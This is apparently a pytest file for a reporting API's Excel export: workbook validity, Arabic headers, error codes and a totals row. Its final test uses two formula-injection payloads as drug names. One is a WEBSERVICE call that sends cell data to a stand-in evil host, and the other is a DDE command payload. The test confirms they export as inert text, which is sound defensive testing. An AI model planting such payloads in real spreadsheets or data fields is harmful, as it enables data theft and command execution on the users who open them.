"""S3.1 report framework (ticket #23): Excel export.

`GET /api/v1/reports/{code}/export?format=xlsx` produces a real .xlsx
(openpyxl) of the SAME grid the printable page shows — RTL sheet,
black-on-white irrelevant here, money cells kept as exact decimal STRINGS
(never float). Unknown code / bad format are 400-class errors.
"""
import io
import zipfile

from tests.reports_test_utils import _login_token


async def test_xlsx_export_is_a_real_workbook(client):
    token = await _login_token(client)
    r = await client.get(
        "/api/v1/reports/day_profit/export",
        params={"format": "xlsx"},
        headers={"Authorization": f"Bearer {token}"},
    )
    assert r.status_code == 200, r.text
    assert (
        r.headers["content-type"]
        == "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    )
    assert "attachment" in r.headers["content-disposition"]
    assert "day_profit" in r.headers["content-disposition"]

    # a valid xlsx is a zip carrying the workbook + worksheet parts
    zf = zipfile.ZipFile(io.BytesIO(r.content))
    names = set(zf.namelist())
    assert "xl/workbook.xml" in names
    assert any(n.startswith("xl/worksheets/sheet") for n in names)


async def test_xlsx_carries_the_grid_values(client):
    """The sheet contains the Arabic title, headers and exact-decimal values."""
    token = await _login_token(client)
    r = await client.get(
        "/api/v1/reports/day_profit/export",
        params={"format": "xlsx"},
        headers={"Authorization": f"Bearer {token}"},
    )
    assert r.status_code == 200
    # openpyxl writes cell text inline in the worksheet part
    zf = zipfile.ZipFile(io.BytesIO(r.content))
    sheet = zf.read("xl/worksheets/sheet1.xml").decode("utf-8")
    assert "ربح اليوم" in sheet
    assert "صافي الربح" in sheet


async def test_export_unknown_code_is_404_and_bad_format_400(client):
    token = await _login_token(client)
    headers = {"Authorization": f"Bearer {token}"}
    missing = await client.get(
        "/api/v1/reports/nope/export", params={"format": "xlsx"}, headers=headers
    )
    assert missing.status_code == 404

    bad = await client.get(
        "/api/v1/reports/day_profit/export",
        params={"format": "docx"},
        headers=headers,
    )
    assert bad.status_code == 400


async def test_xlsx_of_a_report_with_totals_row(client):
    """drawer_handover carries a bold totals foot — exports include it."""
    token = await _login_token(client)
    r = await client.get(
        "/api/v1/reports/drawer_handover/export",
        params={"format": "xlsx", "date_from": "2000-01-01", "date_to": "2000-01-02"},
        headers={"Authorization": f"Bearer {token}"},
    )
    assert r.status_code == 200
    zf = zipfile.ZipFile(io.BytesIO(r.content))
    sheet = zf.read("xl/worksheets/sheet1.xml").decode("utf-8")
    assert "الإجمالي" in sheet


async def test_xlsx_neutralizes_formula_injection(client):
    """A drug named '=WEBSERVICE(...)' must export as TEXT, never a formula.

    Second-order CSV-style injection (CWE-1236): a low-priv user plants the
    name via drugs.manage; an admin opens the Excel export.
    """
    from app.reports.exports import build_xlsx

    content = build_xlsx(
        title_ar="النواقص",
        title_en="Stock Below Minimum",
        meta=[],
        columns=["الصنف", "الرصيد"],
        rows=[["=WEBSERVICE(\"http://evil.example/x?d=\"&A1)", "2.00"], ["+CMD|'/c calc'!A0", "1.00"]],
        foot=None,
        note=None,
    )
    zf = zipfile.ZipFile(io.BytesIO(content))
    sheet = zf.read("xl/worksheets/sheet1.xml").decode("utf-8")
    assert "<f>" not in sheet  # no live formulas anywhere
    assert "WEBSERVICE" in sheet  # the text is preserved
